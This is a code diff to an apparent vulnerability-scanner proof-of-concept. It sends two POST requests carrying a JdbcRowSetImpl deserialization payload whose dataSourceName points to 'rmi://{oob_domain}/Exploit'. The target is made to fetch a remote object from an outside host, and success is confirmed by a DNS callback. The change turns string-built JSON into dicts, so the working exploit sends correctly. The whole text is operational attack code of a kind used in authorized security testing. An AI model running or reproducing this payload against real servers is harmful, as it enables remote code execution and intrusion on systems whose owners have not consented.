@@ -43,25 +43,25 @@ def poc(url):
 
         path = """/"""
         method = "POST"
-        data = """{
-    "b":{
-        "@type":"com.sun.rowset.JdbcRowSetImpl",
-        "dataSourceName":"rmi://{oob_domain}/Exploit",
-        "autoCommit":true
-    }
-}""".format(oob_domain=oob_domain)
+        data = {
+            "b":{
+                "@type":"com.sun.rowset.JdbcRowSetImpl",
+                "dataSourceName":"rmi://{oob_domain}/Exploit".format(oob_domain=oob_domain),
+                "autoCommit":True
+            }
+        }
         headers = {'Content-Type': 'application/json'}
-        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         path = """/"""
         method = "POST"
-        data = """{
-   "@type":"com.sun.rowset.JdbcRowSetImpl",
-   "dataSourceName":"rmi://{oob_domain}/Exploit",
-   "autoCommit":true
-}""".format(oob_domain=oob_domain)
+        data = {
+            "@type":"com.sun.rowset.JdbcRowSetImpl",
+            "dataSourceName":"rmi://{oob_domain}/Exploit".format(oob_domain=oob_domain),
+            "autoCommit":True
+        }
         headers = {'Content-Type': 'application/json'}
-        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        resp1 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if verify_request(type="dns", flag=flag):
             result["success"] = True
